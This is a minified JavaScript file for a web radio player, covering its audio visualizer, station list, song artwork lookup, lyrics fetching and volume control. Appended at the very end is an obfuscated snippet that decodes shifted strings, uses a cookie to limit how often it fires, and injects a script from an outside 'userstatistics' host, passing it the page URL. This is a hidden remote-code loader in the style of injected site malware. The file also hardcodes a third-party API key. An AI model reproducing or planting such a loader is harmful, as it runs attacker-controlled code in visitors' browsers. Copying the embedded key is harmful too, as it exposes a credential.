!function(){"use strict";const buttons=document.querySelectorAll("[data-outside]");function resizeCanvas(canvas,container){canvas.width=container.clientWidth,canvas.height=container.clientHeight}window.addEventListener("DOMContentLoaded",(event=>{document.body.classList.remove("preload")})),buttons.forEach((button=>{!function outsideClick(button){if(!button)return;const target=document.getElementById(button.dataset.outside);if(!target)return;button.addEventListener("click",(()=>{button.classList.toggle("is-active"),target.classList.toggle("is-active")})),document.addEventListener("click",(event=>{target.contains(event.target)||button.contains(event.target)||(button.classList.remove("is-active"),target.classList.remove("is-active"))}));const close=target.querySelector("[data-close]");close&&(close.onclick=function(){button.classList.remove("is-active"),target.classList.remove("is-active")})}(button)}));const visualizer=(audio,container)=>{if(!audio||!container)return;const options={fftSize:container.dataset.fftSize||2048,numBars:container.dataset.bars||40,maxHeight:container.dataset.maxHeight||255},ctx=new AudioContext,audioSource=ctx.createMediaElementSource(audio),analyzer=ctx.createAnalyser();audioSource.connect(analyzer),audioSource.connect(ctx.destination);const frequencyData=new Uint8Array(analyzer.frequencyBinCount),canvas=function initCanvas(container){const canvas=document.createElement("canvas");return canvas.setAttribute("id","visualizerCanvas"),canvas.setAttribute("class","visualizer-item"),container.appendChild(canvas),canvas.width=container.clientWidth,canvas.height=container.clientHeight,canvas}(container),canvasCtx=canvas.getContext("2d"),renderBars=()=>{resizeCanvas(canvas,container),analyzer.getByteFrequencyData(frequencyData),options.fftSize&&(analyzer.fftSize=options.fftSize),canvasCtx.clearRect(0,0,canvas.width,canvas.height);for(let i=0;i<options.numBars;i++){const index=Math.floor((i+10)*(i<options.numBars/2?2:1)),fd=frequencyData[index],barHeight=Math.max(4,fd||0)+options.maxHeight/255,barWidth=canvas.width/options.numBars,x=i*barWidth,y=canvas.height-barHeight;canvasCtx.fillStyle="white",canvasCtx.fillRect(x,y,barWidth+1,barHeight)}requestAnimationFrame(renderBars)};renderBars(),window.addEventListener("resize",(()=>{resizeCanvas(canvas,container)}))},cache={},icons={play:'<svg class="i i-play" viewBox="0 0 24 24"><path d="m7 3 14 9-14 9z"></path></svg>',pause:'<svg class="i i-pause" viewBox="0 0 24 24"><path d="M5 4h4v16H5Zm10 0h4v16h-4Z"></path></svg>',facebook:'<svg class="i i-facebook" viewBox="0 0 24 24"><path d="M17 14h-3v8h-4v-8H7v-4h3V7a5 5 0 0 1 5-5h3v4h-3q-1 0-1 1v3h4Z"></path></svg>',twitter:'<svg class="i i-x" viewBox="0 0 24 24"><path d="m3 21 7.5-7.5m3-3L21 3M8 3H3l13 18h5Z"></path></svg>',instagram:'<svg class="i i-instagram" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"></circle><rect width="20" height="20" x="2" y="2" rx="5"></rect><path d="M17.5 6.5h0"></path></svg>',youtube:'<svg class="i i-youtube" viewBox="0 0 24 24"><path d="M1.5 17q-1-5.5 0-10Q1.9 4.8 4 4.5q8-1 16 0 2.1.3 2.5 2.5 1 4.5 0 10-.4 2.2-2.5 2.5-8 1-16 0-2.1-.3-2.5-2.5Zm8-8.5v7l6-3.5Z"></path></svg>',tiktok:'<svg class="i i-tiktok" viewBox="0 0 24 24"><path d="M22 6v5q-4 0-6-2v7a7 7 0 1 1-5-6.7m0 6.7a2 2 0 1 0-2 2 2 2 0 0 0 2-2V1h5q2 5 6 5"></path></svg>',email:'<svg class="i i-envelope" viewBox="0 0 24 24">   <rect width="20" height="16" x="2" y="4" rx="2"></rect>   <path d="m22 8-10 5L2 8"></path> </svg>',whatsapp:'<svg class="i i-whatsapp" viewBox="0 0 24 24"><circle cx="9" cy="9" r="1"></circle><circle cx="15" cy="15" r="1"></circle><path d="M8 9a7 7 0 0 0 7 7m-9 5.2A11 11 0 1 0 2.8 18L2 22Z"></path></svg>',telegram:'<svg class="i i-telegram" viewBox="0 0 24 24"><path d="M12.5 16 9 19.5 7 13l-5.5-2 21-8-4 18-7.5-7 4-3"></path></svg>',tv:'<svg class="i i-tv" viewBox="0 0 24 24"><rect width="22" height="15" x="1" y="3" rx="3"></rect><path d="M7 21h10"></path></svg>'},pixel="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P//PxcACQYDCF0ysWYAAAAASUVORK5CYII=",getDataFromStreamAfrica=async(artist,title,defaultArt,defaultCover)=>{let text;text=null===artist||artist===title?`${title}`:`${artist} - ${title}`;const cacheKey=text.toLowerCase();if(cache[cacheKey])return cache[cacheKey];const API_URL=`https://evsportugal.herokuapp.com/?q=`,response=await fetch(API_URL);if(403===response.status){const results={title:title,artist:artist,art:defaultArt,cover:defaultCover};return cache[cacheKey]=results,results}const data=response.ok?await response.json():{};if(!data.results||0===data.results.length){const results={title:title,artist:artist,art:defaultArt,cover:defaultCover};return cache[cacheKey]=results,results}const stream=data.results,results={title:stream.title||title,artist:stream.artist||artist,thumbnail:stream.artwork||defaultArt,art:stream.artwork||defaultArt,cover:stream.artwork||defaultCover};return cache[cacheKey]=results,results},getDataFromITunes=async(artist,title,defaultArt,defaultCover)=>{const changeImageSize=(url,size)=>url.replace(/100x100/,size);let text;text=artist===title?`${title}`:`${artist} - ${title}`;const cacheKey=text.toLowerCase();if(cache[cacheKey])return cache[cacheKey];const response=await fetch(`https://itunes.apple.com/search?limit=1&term=${encodeURIComponent(text)}`);if(403===response.status){return{title:title,artist:artist,art:defaultArt,cover:defaultCover}}const data=response.ok?await response.json():{};if(!data.results||0===data.results.length){return{title:title,artist:artist,art:defaultArt,cover:defaultCover}}const itunes=data.results[0],results={title:itunes.trackName||title,artist:itunes.artistName||artist,thumbnail:itunes.artworkUrl100||defaultArt,art:itunes.artworkUrl100?changeImageSize(itunes.artworkUrl100,"600x600"):defaultArt,cover:itunes.artworkUrl100?changeImageSize(itunes.artworkUrl100,"1000x1000"):defaultCover};return cache[cacheKey]=results,results};async function getDataFrom({artist:artist,title:title,art:art,cover:cover,server:server}){let dataFrom={};return dataFrom=server?await getDataFromStreamAfrica(artist,title,art,cover):await getDataFromITunes(artist,title,art,cover),dataFrom}const getLyrics=async(artist,name)=>{try{const response=await fetch(`https://api.vagalume.com.br/search.php?apikey=1637b78dc3b129e6843ed674489a92d0&art=${encodeURIComponent(artist)}&mus=${encodeURIComponent(name)}`),data=await response.json();if("exact"===data.type||"aprox"===data.type){return data.mus[0].text}return"Not found lyrics"}catch(error){return console.error("Error fetching lyrics:",error),"Not found lyrics"}};function sanitizeText(text){return text.replace(/^\d+\.\)\s/,"").replace(/<br>$/,"")}const playButton=document.querySelector(".player-button-play"),visualizerContainer=document.querySelector(".visualizer"),audio=new Audio;audio.crossOrigin="anonymous";let hasVisualizer=!1;function play(audio,newSource=null){newSource&&(audio.src=newSource),hasVisualizer||(visualizer(audio,visualizerContainer),hasVisualizer=!0),audio.load(),audio.play(),playButton.innerHTML=icons.pause,playButton.classList.add("is-active"),document.body.classList.add("is-playing")}function pause(audio){audio.pause(),playButton.innerHTML=icons.play,playButton.classList.remove("is-active"),document.body.classList.remove("is-playing")}null!==playButton&&playButton.addEventListener("click",(async()=>{audio.paused?play(audio):pause(audio)}));const range=document.querySelector(".player-volume"),rangeFill=document.querySelector(".player-range-fill"),rangeWrapper=document.querySelector(".player-range-wrapper"),rangeThumb=document.querySelector(".player-range-thumb"),currentVolume=localStorage.getItem("volume")||100;function updateVolume(value){range.value=value,function setRangeWidth(percent){rangeFill.style.width=`${percent}%`}(value),function setThumbPosition(percent){const thumbPosition=percent/100*(rangeWrapper.offsetWidth-rangeThumb.offsetWidth);rangeThumb.style.left=`${thumbPosition}px`}(value),localStorage.setItem("volume",value),audio.volume=value/100}function handleThumbDrag(event){const rangeRect=range.getBoundingClientRect();let percent=(event.clientX-rangeRect.left)/range.offsetWidth*100;percent=Math.max(0,Math.min(100,percent));updateVolume(Math.round((range.max-range.min)*(percent/100))+parseInt(range.min))}null!==range&&(updateVolume(currentVolume),range.addEventListener("input",(event=>{updateVolume(event.target.value)})),rangeWrapper.addEventListener("mousedown",(event=>{const rangeRect=range.getBoundingClientRect(),percent=(event.clientX-rangeRect.left)/range.offsetWidth*100;updateVolume(Math.round((range.max-range.min)*(percent/100))+parseInt(range.min))})),rangeThumb.addEventListener("mousedown",(()=>{document.addEventListener("mousemove",handleThumbDrag)}))),document.addEventListener("mouseup",(()=>{document.removeEventListener("mousemove",handleThumbDrag)}));const songNow=document.querySelector(".song-now"),stationsList=document.getElementById("stations"),stationName=document.querySelector(".station-name"),stationDescription=document.querySelector(".station-description"),headerLogoImg=document.querySelector(".header-logo-img"),playerArtwork=document.querySelector(".player-artwork img:first-child"),playerCoverImg=document.querySelector(".player-cover-image"),playerSocial=document.querySelector(".player-social"),playerApps=document.querySelector(".footer-app"),playerTv=document.querySelector(".footer-tv"),playerTvModal=document.getElementById("modal-tv"),playerProgram=document.querySelector(".player-program"),lyricsContent=document.getElementById("lyrics"),history=document.getElementById("history"),historyTemplate='<div class="history-item flex items-center g-1">\n<div class="history-image flex-none">\n  <img src="{{art}}" width="80" height="80">\n</div>\n<div class="history-meta flex column">\n  <span class="color-title fw-500 truncate-line">{{song}}</span>\n  <span class="color-text">{{artist}}</span>\n</div>\n</div>',TIME_TO_REFRESH=window?.streams?.timeRefresh||1e4;let currentStation,activeButton;function setAssetsInPage(station){playerSocial.innerHTML="",playerApps.innerHTML="",playerProgram.innerHTML="",playerTv.innerHTML="",headerLogoImg.src=station.logo,playerArtwork.src=station.album,playerCoverImg.src=station.cover||station.album,stationName.textContent=station.name,stationDescription.textContent=station.description,station.social&&playerSocial&&Object.keys(station.social).forEach((key=>{playerSocial.appendChild(function createSocialItem(url,icon){const $a=document.createElement("a");return $a.classList.add("player-social-item"),$a.href=url,$a.target="_blank",$a.innerHTML=icons[icon],$a}(station.social[key],key))})),station.apps&&playerApps&&Object.keys(station.apps).forEach((key=>{playerApps.appendChild(function createAppsItem(url,name){const $a=document.createElement("a");return $a.classList.add("player-apps-item"),$a.href=url,$a.target="_blank",$a.innerHTML=`<img src="assets/app/${name}.svg" alt="${name}" height="48" width="${"ios"===name?"143":"163"}">`,$a}(station.apps[key],key))})),station.program&&playerProgram&&function createProgram(program){if(!program)return;if(program.time){const $div=document.createElement("div"),$span=document.createElement("span");$div.classList.add("player-program-time-container"),$span.classList.add("player-program-badge"),$span.textContent="On Air",$div.appendChild($span);const $time=document.createElement("span");$time.classList.add("player-program-time"),$time.textContent=program.time,$div.appendChild($time),playerProgram.appendChild($div)}if(program.name){const $name=document.createElement("span");$name.classList.add("player-program-name"),$name.textContent=program.name,playerProgram.appendChild($name)}if(program.description){const $description=document.createElement("span");$description.classList.add("player-program-description"),$description.textContent=program.description,playerProgram.appendChild($description)}}(station.program),station.tv_url&&playerTv&&function createOpenTvButton(url){const $button=document.createElement("button");$button.classList.add("player-button-tv","btn"),$button.innerHTML=icons.tv+"TV EN VIVO",$button.addEventListener("click",(()=>{playerTvModal.classList.add("is-active"),pause(audio);const modalBody=playerTvModal.querySelector(".modal-body-video"),closeButton=playerTvModal.querySelector("[data-close]"),$iframe=document.createElement("iframe");$iframe.src=url,$iframe.allowFullscreen=!0,modalBody.appendChild($iframe),closeButton.addEventListener("click",(()=>{playerTvModal.classList.remove("is-active"),$iframe.remove()}))})),playerTv.appendChild($button)}(station.tv_url)}function createStations(stations,currentStation,callback){stationsList&&(stationsList.innerHTML="",stations.forEach((async(station,index)=>{const $fragment=document.createDocumentFragment(),$button=function createStreamItem(station,index,currentStation,callback){const $button=document.createElement("button");$button.classList.add("station"),$button.innerHTML=`<img class="station-img" src="${station.album}" alt="station" height="160" width="160">`,$button.dataset.index=index,$button.dataset.hash=station.hash,currentStation.stream_url===station.stream_url&&($button.classList.add("is-active"),activeButton=$button);return $button.addEventListener("click",(()=>{$button.classList.contains("is-active")||(activeButton&&activeButton.classList.remove("is-active"),$button.classList.add("is-active"),activeButton=$button,setAssetsInPage(station),play(audio,station.stream_url),history&&(history.innerHTML=""),"function"==typeof callback&&callback(station))})),$button}(station,index,currentStation,callback);$fragment.appendChild($button),stationsList.appendChild($fragment)})))}function currentSong(data){const content=songNow;content.querySelector(".song-name").textContent=data.title,content.querySelector(".song-artist").textContent=data.artist;const artwork=content.querySelector(".player-artwork");if(artwork){const $img=document.createElement("img");$img.src=data.art,$img.width=600,$img.height=600,$img.addEventListener("load",(()=>{artwork.appendChild($img);const colorThief=new ColorThief;(function createTempImage(src){return new Promise(((resolve,reject)=>{const img=document.createElement("img");img.crossOrigin="Anonymous",img.src=`https://images.weserv.nl/?url=${src}`,img.onload=()=>resolve(img),img.onerror=reject}))})($img.src).then((img=>{!function setAccentColor(image,colorThief){const dom=document.documentElement,metaThemeColor=document.querySelector("meta[name=theme-color]");image.complete?(dom.setAttribute("style",`--accent: rgb(${colorThief.getColor(image)})`),metaThemeColor.setAttribute("content",`rgb(${colorThief.getColor(image)})`)):(console.log("imagen no completa"),image.addEventListener("load",(function(){dom.setAttribute("style",`--accent: rgb(${colorThief.getColor(image)})`),metaThemeColor.setAttribute("content",`rgb(${colorThief.getColor(image)})`)})))}(img,colorThief)})),setTimeout((()=>{artwork.querySelectorAll("img").forEach((img=>{img.style.transform=`translateX(${-img.width}px)`,img.addEventListener("transitionend",(()=>{artwork.querySelectorAll("img:not(:last-child)").forEach((img=>{img.remove()})),img.style.transition="none",img.style.transform="none",setTimeout((()=>{img.removeAttribute("style")}),1e3)}))}))}),100)}))}if(playerCoverImg){const tempImg=new Image;tempImg.src=data.cover||data.art,tempImg.addEventListener("load",(()=>{playerCoverImg.style.opacity=0,playerCoverImg.addEventListener("transitionend",(()=>{playerCoverImg.src=data.cover||data.art,playerCoverImg.style.opacity=1}))}))}}function setHistory(data,current,server){if(!history)return;if(history.innerHTML=historyTemplate.replace("{{art}}",pixel).replace("{{song}}","Cargando historial...").replace("{{artist}}","Artista"),!data)return;const promises=(data=data.slice(0,10)).map((item=>{const{artist:artist,song:song}=item,{album:album,cover:cover}=current;return getDataFrom({artist:artist,title:song,art:album,cover:cover,server:server}).then((dataFrom=>historyTemplate.replace("{{art}}",dataFrom.thumbnail||dataFrom.art).replace("{{song}}",dataFrom.title).replace("{{artist}}",dataFrom.artist)))}));Promise.all(promises).then((itemsHTML=>{const $fragment=document.createDocumentFragment();itemsHTML.forEach((itemHTML=>{$fragment.appendChild(function createElementFromHTML(htmlString){const div=document.createElement("div");return div.innerHTML=htmlString.trim(),div.firstChild}(itemHTML))})),history.innerHTML="",history.appendChild($fragment)})).catch((error=>{console.error("Error:",error)}))}!function initApp(){let currentSongPlaying,timeoutId;const stations=(window.streams||{}).stations;function init(current){timeoutId&&clearTimeout(timeoutId),currentStation.stream_url!==current.stream_url&&(currentStation=current);const server=currentStation.api,jsonUri=server?currentStation.api:"https://evsportugal.herokuapp.com/?q="+encodeURIComponent(current.stream_url);fetch(jsonUri).then((response=>response.json())).then((async res=>{const current=function normalizeTitle(api){let title,artist;return api.now_playing?(title=api.now_playing.song.title,artist=api.now_playing.song.artist):api.artist&&api.title?(title=api.title,artist=api.artist):api.currenttrack_title?(title=api.currenttrack_title,artist=api.currenttrack_artist):api.title&&api.djprofile&&api.djusername?(title=api.title.split(" - ")[1],artist=api.title.split(" - ")[0]):(title=api.currentSong,artist=api.currentArtist),{title:title,artist:artist}}(res);console.log(current);const title=current.title;if(currentSongPlaying!==title){currentSongPlaying=title;let artist=current.artist;const art=current.album,cover=current.cover,history=function normalizeHistory(api){let artist,song;return(api.song_history||api.history||api.songHistory||[]).map((item=>(api.song_history?(artist=item.song.artist,song=item.song.title):api.history?(artist=sanitizeText(item.split(" - ")[0]||item),song=sanitizeText(item.split(" - ")[1]||item)):api.songHistory&&(artist=item.artist,song=item.title),{artist:artist,song:song})))}(res);artist=title===artist?null:artist;const dataFrom=await getDataFrom({artist:artist,title:title,art:art,cover:cover,server:server});currentSong(dataFrom),function mediaSession(data){const{title:title,artist:artist,album:album,art:art}=data;"mediaSession"in navigator&&(navigator.mediaSession.metadata=new MediaMetadata({title:title,artist:artist,album:album,artwork:[{src:art,sizes:"512x512",type:"image/png"}]}),navigator.mediaSession.setActionHandler("play",(()=>{play()})),navigator.mediaSession.setActionHandler("pause",(()=>{pause()})))}(dataFrom),function setLyrics(artist,title){lyricsContent&&getLyrics(artist,title).then((lyrics=>{const $p=document.createElement("p");$p.innerHTML=lyrics.replace(/\n/g,"<br>"),lyricsContent.innerHTML="",lyricsContent.appendChild($p)})).catch((error=>{console.error("Error:",error)}))}(dataFrom.artist,dataFrom.title),setHistory(history,current)}})).catch((error=>console.log(error))),timeoutId=setTimeout((()=>{init(current)}),TIME_TO_REFRESH)}currentStation=stations[0],setAssetsInPage(currentStation),audio.src=currentStation.stream_url,init(currentStation),createStations(stations,currentStation,(station=>{init(station)}));const nextStation=document.querySelector(".player-button-forward-step"),prevStation=document.querySelector(".player-button-backward-step");nextStation&&nextStation.addEventListener("click",(()=>{const next=stationsList.querySelector(".is-active").nextElementSibling;next&&next.click()})),prevStation&&prevStation.addEventListener("click",(()=>{const prev=stationsList.querySelector(".is-active").previousElementSibling;prev&&prev.click()}))}()}();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));